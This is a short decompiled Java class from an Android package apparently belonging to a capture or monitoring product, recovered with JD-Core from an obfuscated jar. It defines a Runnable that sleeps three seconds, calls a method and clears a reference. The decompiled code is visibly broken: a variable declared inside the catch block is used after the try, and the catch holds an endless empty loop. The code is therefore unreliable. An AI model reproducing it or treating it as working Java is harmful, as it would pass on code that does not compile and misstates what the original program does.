package com.vvt.capture.d.a;

import android.os.SystemClock;

class c
  implements Runnable
{
  c(b paramb) {}
  
  public void run()
  {
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      localObject1 = this.a;
      localObject1 = ((b)localObject1).a;
      ((a)localObject1).e();
      localObject1 = this.a.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = a.j();
        if (bool) {}
        a locala = this.a.a;
      }
    }
    finally
    {
      a.a(this.a.a, null);
    }
    a.a((a)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/d/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */